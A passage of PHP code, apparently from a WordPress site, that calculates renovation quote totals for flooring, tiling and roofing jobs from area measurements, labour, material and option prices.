									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$current_total = $current_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($current_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$current_total = $current_total + ( $range_price_total * $floor_area);
							}

					}

			}


			$proposed = $data['proposed'];
			$proposed_total = 0;
			foreach($proposed_data as $temp) {
					if( $temp['title'] == $proposed ) {


							if($proposed_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$proposed_total = $proposed_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($proposed_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$proposed_total = $proposed_total + ( $range_price_total * $floor_area);
							}

					}

			}

			$extras = $data['extras'];
			$extras_total = 0;
			foreach($extras_data as $temp) {
					if( in_array($temp['title'],$extras) ) {

							// let's count QNT of each extras field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extras_count = $data['' . $count_field_title . ''];
							if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
								   $extras_count = 1;
							}

							if($extras_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
							}
							elseif($extras_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extras_total = $extras_total + ( $range_price_total * $extras_count);
							}

					}

			}
    
    if($demolition != 'Yes') {
				$current_total = 0;
		}
		else {
				$current_total = $current_total;
		}

							  $floor_total = $current_total + $proposed_total;
								$tile_floor_total = $floor_total + $extras_total;

							$total = $total + $tile_floor_total;


			} 
  
  // formulas for floor Sanding
	if(htmlspecialchars_decode( get_the_title($t) ) == 'Floor Staining & Oil') {

							$all_scope_data = get_field('quote_fields',$t);

								 $width = $data['area_width'];
								 $length = $data['area_length'];
								 $supply_area = $data['supply_area'];
								 $supply_price = $data['supply_price'];
                 $demolition = $data['demolition'];
							
          foreach($all_scope_data as $d) {
									if($d['slug'] == 'current') {
											$current_title = $d['title'];
											$current_prices = $d['type_of_price'];
											$current_data = $d['fields'];
									}
									if($d['slug'] == 'proposed') {
											$proposed_title = $d['title'];
											$proposed_prices = $d['type_of_price'];
											$proposed_data = $d['fields'];
									}
									if($d['slug'] == 'extras') {
											$extras_title = $d['title'];
											$extras_prices = $d['type_of_price'];
											$extras_data = $d['fields'];
									}
								 }

				
			$floor_area = $width * $length;
				
		  $current = $data['current'];
			$current_total = 0;
			foreach($current_data as $temp) {
					if( $temp['title'] == $current ) {


							if($current_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$current_total = $current_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($current_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$current_total = $current_total + ( $range_price_total * $floor_area);
							}

					}

			}


			$proposed = $data['proposed'];
			$proposed_total = 0;
			foreach($proposed_data as $temp) {
					if( $temp['title'] == $proposed ) {


							if($proposed_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$proposed_total = $proposed_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($proposed_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$proposed_total = $proposed_total + ( $range_price_total * $floor_area);
							}

					}

			}

			$extras = $data['extras'];
			$extras_total = 0;
			foreach($extras_data as $temp) {
					if( in_array($temp['title'],$extras) ) {

							// let's count QNT of each extras field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extras_count = $data['' . $count_field_title . ''];
							if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
								   $extras_count = 1;
							}

							if($extras_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
							}
							elseif($extras_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extras_total = $extras_total + ( $range_price_total * $extras_count);
							}

					}

			}
    
    if($demolition != 'Yes') {
				$current_total = 0;
		}
		else {
				$current_total = $current_total;
		}

							  $floor_total = $current_total + $proposed_total;
								$tile_floor_total = $floor_total + $extras_total;

							$total = $total + $tile_floor_total;


			} 
  
	 
	// formulas for vinyl flooring
	if(get_the_title($t) == 'Vinyl Flooring') {

								 $all_scope_data = get_field('quote_fields',$t);

								 $width = $data['area_width'];
								 $length = $data['area_length'];
										   $supply_area = $data['supply_area'];
										   $supply_price = $data['supply_price'];
							foreach($all_scope_data as $d) {
									if($d['slug'] == 'current') {
											$current_title = $d['title'];
											$current_prices = $d['type_of_price'];
											$current_data = $d['fields'];
									}
									if($d['slug'] == 'proposed') {
											$proposed_title = $d['title'];
											$proposed_prices = $d['type_of_price'];
											$proposed_data = $d['fields'];
									}
									if($d['slug'] == 'extras') {
											$extras_title = $d['title'];
											$extras_prices = $d['type_of_price'];
											$extras_data = $d['fields'];
									}
								 }

				
			  $floor_area = $width * $length;
			$supply_total = $supply_area * $supply_price;
				
					  $current = $data['current'];
			$current_total = 0;
			foreach($current_data as $temp) {
					if( $temp['title'] == $current ) {


							if($current_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$current_total = $current_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($current_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$current_total = $current_total + ( $range_price_total * $floor_area);
							}

					}

			}


			  $proposed = $data['proposed'];
			$proposed_total = 0;
			foreach($proposed_data as $temp) {
					if( $temp['title'] == $proposed ) {


							if($proposed_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$proposed_total = $proposed_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($proposed_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$proposed_total = $proposed_total + ( $range_price_total * $floor_area);
							}

					}

			}

			  $extras = $data['extras'];
			$extras_total = 0;
			foreach($extras_data as $temp) {
					if( in_array($temp['title'],$extras) ) {

							// let's count QNT of each extras field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extras_count = $data['' . $count_field_title . ''];
							if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
								   $extras_count = 1;
							}

							if($extras_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
							}
							elseif($extras_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extras_total = $extras_total + ( $range_price_total * $extras_count);
							}

					}

			}

							  $floor_total = $current_total + $proposed_total;
									  $vinyl_floor_total = $floor_total + $extras_total + $supply_total;

							$total = $total + $vinyl_floor_total;


			}
	
	// formulas for vinyl flooring
	if(get_the_title($t) == 'Wood Flooring') {

								 $all_scope_data = get_field('quote_fields',$t);

								 $width = $data['area_width'];
								 $length = $data['area_length'];
										   $supply_area = $data['supply_area'];
										   $supply_price = $data['supply_price'];
							foreach($all_scope_data as $d) {
									if($d['slug'] == 'current') {
											$current_title = $d['title'];
											$current_prices = $d['type_of_price'];
											$current_data = $d['fields'];
									}
									if($d['slug'] == 'proposed') {
											$proposed_title = $d['title'];
											$proposed_prices = $d['type_of_price'];
											$proposed_data = $d['fields'];
									}
									if($d['slug'] == 'extras') {
											$extras_title = $d['title'];
											$extras_prices = $d['type_of_price'];
											$extras_data = $d['fields'];
									}
								 }

				
			  $floor_area = $width * $length;
			$supply_total = $supply_area * $supply_price;
				
					  $current = $data['current'];
			$current_total = 0;
			foreach($current_data as $temp) {
					if( $temp['title'] == $current ) {


							if($current_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$current_total = $current_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($current_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$current_total = $current_total + ( $range_price_total * $floor_area);
							}

					}

			}


			  $proposed = $data['proposed'];
			$proposed_total = 0;
			foreach($proposed_data as $temp) {
					if( $temp['title'] == $proposed ) {


							if($proposed_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$proposed_total = $proposed_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($proposed_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$proposed_total = $proposed_total + ( $range_price_total * $floor_area);
							}

					}

			}

			  $extras = $data['extras'];
			$extras_total = 0;
			foreach($extras_data as $temp) {
					if( in_array($temp['title'],$extras) ) {

							// let's count QNT of each extras field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extras_count = $data['' . $count_field_title . ''];
							if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
								   $extras_count = 1;
							}

							if($extras_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
							}
							elseif($extras_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extras_total = $extras_total + ( $range_price_total * $extras_count);
							}

					}

			}

							  $floor_total = $current_total + $proposed_total;
									  $vinyl_floor_total = $floor_total + $extras_total + $supply_total;

							$total = $total + $vinyl_floor_total;


			}
	
		 // formulas for carpet flooring
	if(get_the_title($t) == 'Carpet Flooring') {

								 $all_scope_data = get_field('quote_fields',$t);

								 $width = $data['area_width'];
								 $length = $data['area_length'];
										   $supply_area = $data['supply_area'];
										   $supply_price = $data['supply_price'];
							foreach($all_scope_data as $d) {
									if($d['slug'] == 'current') {
											$current_title = $d['title'];
											$current_prices = $d['type_of_price'];
											$current_data = $d['fields'];
									}
									if($d['slug'] == 'proposed') {
											$proposed_title = $d['title'];
											$proposed_prices = $d['type_of_price'];
											$proposed_data = $d['fields'];
									}
									if($d['slug'] == 'extras') {
											$extras_title = $d['title'];
											$extras_prices = $d['type_of_price'];
											$extras_data = $d['fields'];
									}
								 }

				
			  $floor_area = $width * $length;
			$supply_total = $supply_area * $supply_price;
				
					  $current = $data['current'];
			$current_total = 0;
			foreach($current_data as $temp) {
					if( $temp['title'] == $current ) {


							if($current_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$current_total = $current_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($current_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$current_total = $current_total + ( $range_price_total * $floor_area);
							}

					}

			}


			  $proposed = $data['proposed'];
			$proposed_total = 0;
			foreach($proposed_data as $temp) {
					if( $temp['title'] == $proposed ) {


							if($proposed_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$proposed_total = $proposed_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($proposed_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$proposed_total = $proposed_total + ( $range_price_total * $floor_area);
							}

					}

			}

			  $extras = $data['extras'];
			$extras_total = 0;
			foreach($extras_data as $temp) {
					if( in_array($temp['title'],$extras) ) {

							// let's count QNT of each extras field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extras_count = $data['' . $count_field_title . ''];
							if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
								   $extras_count = 1;
							}

							if($extras_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
							}
							elseif($extras_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extras_total = $extras_total + ( $range_price_total * $extras_count);
							}

					}

			}

							  $floor_total = $current_total + $proposed_total;
									  $vinyl_floor_total = $floor_total + $extras_total + $supply_total;

							$total = $total + $vinyl_floor_total;


			}


	// V2 formulas for Flooring template
	if(get_the_title($t) == 'Timber Flooring') {

			$all_scope_data = get_field('quote_fields',$t);

			$width = $data['square_width'];
			$length = $data['square_length'];

			$area = $width * $length;

			foreach($all_scope_data as $d) {
					if($d['slug'] == 'current') {
							$current_title = $d['title'];
							$current_prices = $d['type_of_price'];
							$current_data = $d['fields'];
					}
					if($d['slug'] == 'proposed') {
							$proposed_title = $d['title'];
							$proposed_prices = $d['type_of_price'];
							$proposed_data = $d['fields'];
					}
					if($d['slug'] == 'remove') {
							$remove_title = $d['title'];
							$remove_prices = $d['type_of_price'];
							$remove_data = $d['fields'];
					}
					if($d['slug'] == 'extra') {
							$extra_title = $d['title'];
							$extra_prices = $d['type_of_price'];
							$extra_data = $d['fields'];
					}
			}

			$current = $data['current'];
			$current_total = 0;
			foreach($current_data as $temp) {
					if( in_array($temp['title'],$current)  || $temp['title'] == $current ) {

							if($current_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$current_total = $current_total +  ( $labour_and_material_total * $area );
							}
							elseif($current_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$current_total = $current_total + ( $range_price_total * $area );
							}

					}
			}

			$proposed = $data['proposed'];
			$proposed_total = 0;
			foreach($proposed_data as $temp) {
					if( in_array($temp['title'],$proposed)  || $temp['title'] == $proposed ) {

							if($proposed_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$proposed_total = $proposed_total + ( $labour_and_material_total * $area );
							}
							elseif($proposed_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$proposed_total = $proposed_total + ( $range_price_total * $area );
							}

					}
			}

			$remove = $data['remove'];

			$extra = $data['extra'];
			$extra_total = 0;
			foreach($extra_data as $temp) {
					if( in_array($temp['title'],$extra) || $temp['title'] == $extra ) {

							// let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($extra_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$remove_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extra_total = $extra_total + ( $labour_and_material_total * $extra_count );
							}
							elseif($extra_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extra_total = $extra_total + ( $range_price_total * $extra_count);
							}

					}
			}

			if($remove != 'Yes') {
					$current_total = 0;
			}
			else {
					$current_total = $current_total;
			}
		
			$flooring_total = $current_total + $proposed_total + $extra_total;
			$total = $total + $flooring_total;

	}

	// V2 formulas for Roofing template
	if(get_the_title($t) == 'Roofing') {

		$all_scope_data = get_field('quote_fields',$t);

		$width = $data['area_width'];
		$length = $data['area_length'];

		$area = $width * $length;
		$outer_length = $width + $width + $length + $length;
		$demolition = $data['demolition'];

		foreach($all_scope_data as $d) {
				if($d['slug'] == 'shape') {
						$shape_title = $d['title'];
						$shape_prices = $d['type_of_price'];
						$shape_data = $d['fields'];
				}
				if($d['slug'] == 'current') {
						$current_title = $d['title'];
						$current_prices = $d['type_of_price'];
						$current_data = $d['fields'];
				}
				if($d['slug'] == 'proposed') {
						$proposed_title = $d['title'];
						$proposed_prices = $d['type_of_price'];
						$proposed_data = $d['fields'];
				}
				if($d['slug'] == 'trim') {
						$trim_title = $d['title'];
						$trim_prices = $d['type_of_price'];
						$trim_data = $d['fields'];
				}
				if($d['slug'] == 'extras') {
						$extras_title = $d['title'];
						$extras_prices = $d['type_of_price'];
						$extras_data = $d['fields'];
				}
		}

		$current = $data['current'];
		$current_total = 0;
		foreach($current_data as $temp) {
				if( in_array($temp['title'],$current)  || $temp['title'] == $current ) {

						if($current_prices == 'labour') {
								$labour_price_total = $temp['labour'];
								$labour_price_total_value = 0;
								$material_price_total = $temp['material'];
								$material_price_total_value = 0;
								foreach($labour_price_total as $l) {
										$labour_price_total_value = $labour_price_total_value + $l['price'];
								}
								foreach($material_price_total as $m) {
										$material_price_total_value = $material_price_total_value + $m['price'];
								}
								$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
								// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
								$selectionPrice = 0;
								$selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
								$labour_and_material_total = $labour_and_material_total + $selectionPrice;
								// *** END ***

								$current_total = $current_total +  ( $labour_and_material_total * $area );
						}
						elseif($current_prices == 'range') {
								$range_price_total = $temp['range_price'];
								$current_total = $current_total + ( $range_price_total * $area );
						}

				}
		}

		$shape = $data['shape'];
		$shape_total = 0;
		foreach($shape_data as $temp) {
				if( in_array($temp['title'],$shape)  || $temp['title'] == $shape ) {

						$range_price_total = $temp['range_price'];
						$shape_total = $range_price_total;

				}
		}

		
	  $proposed = $data['proposed'];
		$proposed_total = 0;
		foreach($proposed_data as $temp) {
				if( in_array($temp['title'],$proposed)  || $temp['title'] == $proposed ) {

						if($proposed_prices == 'labour') {
								$labour_price_total = $temp['labour'];
								$labour_price_total_value = 0;
								$material_price_total = $temp['material'];
								$material_price_total_value = 0;
								foreach($labour_price_total as $l) {
										$labour_price_total_value = $labour_price_total_value + $l['price'];
								}
								foreach($material_price_total as $m) {
										$material_price_total_value = $material_price_total_value + $m['price'];
								}
								$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
								// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
								$selectionPrice = 0;
								$selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
								$labour_and_material_total = $labour_and_material_total + $selectionPrice;
								// *** END ***

								$proposed_total = $proposed_total +  ( $labour_and_material_total * $area );
						}
						elseif($proposed_prices == 'range') {
								$range_price_total = $temp['range_price'];
								$proposed_total = $proposed_total + ( $range_price_total * $area );
						}

				}
		}

		$trim = $data['trim'];
		$trim_total = 0;
		foreach($trim_data as $temp) {
				if( in_array($temp['title'],$trim)  || $temp['title'] == $trim ) {

						if($trim_prices == 'labour') {
								$labour_price_total = $temp['labour'];
								$labour_price_total_value = 0;
								$material_price_total = $temp['material'];
								$material_price_total_value = 0;
								foreach($labour_price_total as $l) {
										$labour_price_total_value = $labour_price_total_value + $l['price'];
								}
								foreach($material_price_total as $m) {
										$material_price_total_value = $material_price_total_value + $m['price'];
								}
								$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
								// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
								$selectionPrice = 0;
								$selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
								$labour_and_material_total = $labour_and_material_total + $selectionPrice;
								// *** END ***

								$trim_total = $trim_total +  ( $labour_and_material_total * $area );
						}
						elseif($trim_prices == 'range') {
								$range_price_total = $temp['range_price'];
								$trim_total = $trim_total + ( $range_price_total * $area );
						}

				}
		}
		
		$extras = $data['extras'];
		$extras_total = 0;
		foreach($extras_data as $temp) {
				if( in_array($temp['title'],$extras) || $temp['title'] == $extras ) {

						// let's count QNT of each extra field
						$field_title = $temp['title'];
						$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
						$count_field_title = strtolower($count_field_title);
						$extra_count = $data['' . $count_field_title . ''];
						if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
							   $extra_count = 1;
						}

						if($extras_prices == 'labour') {
								$labour_price_total = $temp['labour'];
								$labour_price_total_value = 0;
								$material_price_total = $temp['material'];
								$material_price_total_value = 0;
								foreach($labour_price_total as $l) {
										$labour_price_total_value = $labour_price_total_value + $l['price'];
								}
								foreach($material_price_total as $m) {
										$material_price_total_value = $material_price_total_value + $m['price'];
								}
								$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
								// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
								$selectionPrice = 0;
								$selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
								$labour_and_material_total = $labour_and_material_total + $selectionPrice;
								// *** END ***

								$extras_total = $extras_total + ( $labour_and_material_total * $extra_count );
						}
						elseif($extras_prices == 'range') {
								$range_price_total = $temp['range_price'];
								$extras_total = $extras_total + ( $range_price_total * $extra_count);
						}

				}
		}

		if($demolition != 'Yes') {
				$current_total = 0;
		}
		else {
